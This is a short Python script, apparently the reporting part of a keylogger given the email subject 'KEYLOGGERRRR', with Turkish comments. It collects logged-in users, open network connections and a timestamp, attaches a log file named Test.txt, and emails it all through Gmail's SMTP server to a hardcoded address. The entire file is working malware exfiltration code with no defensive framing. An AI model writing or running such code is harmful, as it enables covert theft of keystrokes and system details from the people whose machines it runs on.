import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import psutil
import datetime

an = datetime.datetime.now()
Tarih = datetime.datetime.strftime(an, '%x')
Saat = datetime.datetime.strftime(an, '%X')

fromaddr = "merenptah29@gmail.com" #gonderici
toaddr = "merenptah29@gmail.com"   #alici

msg = MIMEMultipart()

msg['From'] = fromaddr
msg['To'] = toaddr
msg['Subject'] = "KEYLOGGERRRR"

body = Tarih + "   " + Saat + "\n\n" + '\n'.join(map(str, psutil.users())) +"\n\n" + '\n'.join(map(str, psutil.net_connections())) + "\n\n"
msg.attach(MIMEText(body, 'plain'))

filename = "Test.txt"
attachment = open("Test.txt", "rb")

part = MIMEBase('application', 'octet-stream')
part.set_payload((attachment).read())
encoders.encode_base64(part)
part.add_header('Content-Disposition', "attachment; filename= %s" % filename)

msg.attach(part)

server = smtplib.SMTP('smtp.gmail.com', 587)
server.ehlo()
server.starttls()
server.ehlo()
server.login(fromaddr, "############") #sifre girilecek
text = msg.as_string()
server.sendmail(fromaddr, toaddr, text)
server.quit()
